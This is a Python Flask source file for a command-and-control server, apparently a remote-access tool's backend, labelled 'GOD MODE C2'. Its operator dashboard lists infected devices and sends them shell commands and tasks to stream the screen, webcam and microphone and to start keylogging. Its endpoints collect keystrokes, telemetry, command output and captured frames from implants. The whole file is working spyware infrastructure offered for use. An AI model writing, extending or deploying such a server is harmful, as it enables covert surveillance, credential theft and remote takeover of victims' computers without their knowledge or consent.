from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
import sqlite3
from datetime import datetime
import base64
from PIL import Image
import io
import threading
import time
import psutil

app = Flask(__name__)
app.config['SECRET_KEY'] = 'godmode-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
CORS(app)

# In-memory storage (Render doesn't persist)
devices = {}
tasks = {}
telemetry_history = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>GOD MODE C2 - 660ae05c5de1c871</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff88; 
            font-family: 'Courier New', monospace; 
            overflow: hidden;
        }
        .header { 
            background: linear-gradient(90deg, #ff0080, #00ff88); 
            padding: 20px; 
            text-align: center;
            box-shadow: 0 0 30px #00ff88;
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; padding: 20px; height: calc(100vh - 100px); }
        .panel { 
            background: rgba(0,255,136,0.1); 
            border: 1px solid #00ff88; 
            border-radius: 10px; 
            padding: 15px; 
            overflow: auto;
            position: relative;
        }
        .panel h3 { color: #ff0080; margin-bottom: 10px; }
        .device-list { max-height: 200px; }
        .terminal { 
            background: #000; 
            color: #00ff00; 
            padding: 10px; 
            font-size: 12px; 
            height: 300px; 
            overflow-y: scroll;
            white-space: pre-wrap;
        }
        .live-video { 
            width: 100%; 
            height: 200px; 
            background: #111; 
            border: 2px solid #00ff88; 
            border-radius: 5px;
        }
        button { 
            background: linear-gradient(45deg, #ff0080, #00ff88); 
            border: none; 
            color: white; 
            padding: 10px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
            margin: 5px;
            font-family: inherit;
        }
        button:hover { box-shadow: 0 0 20px #00ff88; }
        input { 
            background: #111; 
            border: 1px solid #00ff88; 
            color: #00ff88; 
            padding: 8px; 
            border-radius: 5px; 
            width: 200px;
        }
        .status { position: absolute; top: 5px; right: 10px; font-size: 12px; }
        .online { color: #00ff88; }
        .offline { color: #ff4444; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🐱 GOD MODE C2 - LIVE CONTROL</h1>
        <div id="device-status"></div>
    </div>
    
    <div class="grid">
        <div class="panel">
            <h3>📡 DEVICE STATUS</h3>
            <div id="devices" class="device-list"></div>
            <div style="margin-top: 10px;">
                <input id="cmd-input" placeholder="Enter command..." />
                <button onclick="sendCmd()">▶️ EXECUTE</button>
                <br>
                <button onclick="startScreen()">📺 SCREEN STREAM</button>
                <button onclick="startWebcam()">📹 WEBCAM</button>
                <button onclick="startKeylog()">⌨️ KEYLOG</button>
                <button onclick="startMic()">🎤 MIC</button>
            </div>
        </div>
        
        <div class="panel">
            <h3>📺 LIVE SCREEN</h3>
            <div class="live-video" id="screen-stream"></div>
            <div class="status" id="screen-status">OFFLINE</div>
        </div>
        
        <div class="panel">
            <h3>📡 TERMINAL</h3>
            <div class="terminal" id="terminal"></div>
        </div>
        
        <div class="panel">
            <h3>📹 WEBCAM</h3>
            <div class="live-video" id="webcam-stream"></div>
            <div class="status" id="webcam-status">OFFLINE</div>
        </div>
        
        <div class="panel">
            <h3>⌨️ KEYS</h3>
            <div id="keys" style="height: 200px; overflow-y: scroll; background: #000; padding: 10px; font-family: monospace;"></div>
        </div>
        
        <div class="panel">
            <h3>🎤 AUDIO</h3>
            <div id="audio-status" style="height: 200px; background: #000; padding: 10px;"></div>
        </div>
        
        <div class="panel">
            <h3>📊 TELEMETRY</h3>
            <div id="telemetry"></div>
        </div>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        
        socket.on('connect', () => {
            console.log('🔥 C2 CONNECTED');
        });
        
        socket.on('telemetry', (data) => {
            devices[data.id] = data;
            updateDevices();
            document.getElementById('telemetry').innerHTML = 
                `CPU: ${data.cpu}% | RAM: ${data.ram}% | IP: ${data.ip}`;
        });
        
        socket.on('screen_frame', (data) => {
            if (data.id === currentDevice) {
                document.getElementById('screen-stream').innerHTML = 
                    `<img src="data:image/jpeg;base64,${data.frame}" style="width:100%;height:100%;object-fit:cover;">`;
                document.getElementById('screen-status').textContent = '🟢 LIVE 8FPS';
                document.getElementById('screen-status').className = 'status online';
            }
        });
        
        socket.on('webcam_frame', (data) => {
            if (data.id === currentDevice) {
                document.getElementById('webcam-stream').innerHTML = 
                    `<img src="data:image/jpeg;base64,${data.frame}" style="width:100%;height:100%;object-fit:cover;">`;
                document.getElementById('webcam-status').textContent = '🟢 LIVE';
                document.getElementById('webcam-status').className = 'status online';
            }
        });
        
        socket.on('keys', (data) => {
            if (data.id === currentDevice) {
                document.getElementById('keys').innerHTML += data.keys + ' ';
                document.getElementById('keys').scrollTop = document.getElementById('keys').scrollHeight;
            }
        });
        
        socket.on('result', (data) => {
            if (data.id === currentDevice) {
                const term = document.getElementById('terminal');
                term.innerHTML += `[${new Date().toLocaleTimeString()}] ${JSON.stringify(data.result, null, 2)}\n`;
                term.scrollTop = term.scrollHeight;
            }
        });
        
        function updateDevices() {
            const devList = document.getElementById('devices');
            devList.innerHTML = Object.entries(devices)
                .map(([id, dev]) => 
                    `<div style="cursor:pointer;padding:5px;border-bottom:1px solid #333;" 
                         onclick="selectDevice('${id}')">
                        🟢 ${id} - ${dev.host} (${dev.user})<br>
                        <small>${dev.os} | CPU:${dev.cpu}% RAM:${dev.ram}%</small>
                    </div>`
                ).join('');
        }
        
        function selectDevice(id) {
            currentDevice = id;
            document.getElementById('device-status').innerHTML = `🎯 SELECTED: ${id}`;
        }
        
        function sendCmd() {
            const cmd = document.getElementById('cmd-input').value;
            if (currentDevice && cmd) {
                socket.emit('task', {
                    id: currentDevice,
                    type: 'shell',
                    cmd: cmd
                });
                document.getElementById('cmd-input').value = '';
            }
        }
        
        function startScreen() {
            if (currentDevice) {
                socket.emit('task', {
                    id: currentDevice,
                    type: 'stream_screen'
                });
            }
        }
        
        function startWebcam() {
            if (currentDevice) {
                socket.emit('task', {
                    id: currentDevice,
                    type: 'stream_webcam'
                });
            }
        }
        
        function startKeylog() {
            if (currentDevice) {
                socket.emit('task', {
                    id: currentDevice,
                    type: 'keylog_start'
                });
            }
        }
        
        function startMic() {
            if (currentDevice) {
                socket.emit('task', {
                    id: currentDevice,
                    type: 'mic_start'
                });
            }
        }
        
        document.getElementById('cmd-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendCmd();
        });
        
        setInterval(updateDevices, 2000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/tasks/<device_id>')
def get_tasks(device_id):
    return jsonify({'tasks': tasks.get(device_id, [])})

@app.route('/telemetry', methods=['POST'])
def telemetry():
    data = request.json
    device_id = data['id']
    devices[device_id] = data
    socketio.emit('telemetry', data)
    return jsonify({'status': 'ok'})

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    socketio.emit('result', data)
    return jsonify({'status': 'ok'})

@app.route('/stream/screen', methods=['POST'])
def screen_stream():
    data = request.json
    socketio.emit('screen_frame', data)
    return jsonify({'status': 'ok'})

@app.route('/stream/webcam', methods=['POST'])
def webcam_stream():
    data = request.json
    socketio.emit('webcam_frame', data)
    return jsonify({'status': 'ok'})

@app.route('/keys', methods=['POST'])
def keys():
    data = request.json
    socketio.emit('keys', data)
    return jsonify({'status': 'ok'})

@app.route('/stream/audio', methods=['POST'])
def audio_stream():
    data = request.json
    socketio.emit('audio_data', data)
    return jsonify({'status': 'ok'})

@socketio.on('task')
def handle_task(data):
    device_id = data['id']
    if device_id not in tasks:
        tasks[device_id] = []
    tasks[device_id].append(data)
    emit('task_sent', {'status': 'sent'})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
